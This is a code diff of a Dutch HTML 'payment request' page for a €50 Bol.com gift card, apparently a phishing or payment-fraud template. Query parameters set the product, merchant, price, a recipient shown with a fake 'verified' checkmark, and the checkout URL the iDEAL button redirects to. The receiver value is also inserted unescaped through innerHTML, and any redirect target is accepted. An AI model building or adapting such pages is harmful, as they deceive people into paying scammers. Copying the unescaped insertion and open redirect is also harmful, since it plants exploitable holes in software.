@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Betaalverzoek – Bol.com cadeaukaart</title>
+    <title>Betaalverzoek</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
         body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
@@ -44,4 +44,43 @@
         </div>
         <div class="content">
             <div class="amount" id="amount">€50,00</div>
-            <div class="description
+            <div class="description" id="description">Bol.com cadeaukaart via Opwaarderen.nl</div>
+            <div class="recipient">
+                Ontvanger<br>
+                <strong id="receiver">Fleur Jongkamp <span class="check">✓</span></strong>
+            </div>
+            <a href="#" class="pay-button" id="payBtn">Nu betalen met iDEAL</a>
+            <div class="loading" id="loading">
+                <div class="spinner"></div> Doorsturen naar je bank...
+            </div>
+        </div>
+        <div class="footer">
+            Veilig betalen • Geen extra kosten<br>
+            <small>Betaling verwerkt door de gekozen aanbieder</small>
+        </div>
+    </div>
+
+    <script>
+        const p = new URLSearchParams(window.location.search);
+        const article  = p.get('article')  || 'Bol.com cadeaukaart';
+        const merchant = p.get('merchant') || 'Opwaarderen.nl';
+        const price    = p.get('price')    || '50';
+        const receiver = p.get('receiver') || 'Fleur Jongkamp';
+        const checkout = p.get('checkout') || 'https://checkout.buckaroo.nl/html/redirect.ashx?r=FC1C0F88DAC24D9FBBE1DE96414DB6BB';
+
+        document.getElementById('amount').textContent = '€' + parseFloat(price).toFixed(2).replace('.',',');
+        document.getElementById('description').textContent = article + ' via ' + merchant;
+        document.getElementById('receiver').innerHTML = receiver + ' <span class="check">✓</span>';
+
+        const btn = document.getElementById('payBtn');
+        btn.href = checkout;
+
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('loading').style.display = 'block';
+            btn.style.display = 'none';
+            setTimeout(() => { window.location.href = checkout; }, 1200);
+        });
+    </script>
+</body>
+</html>
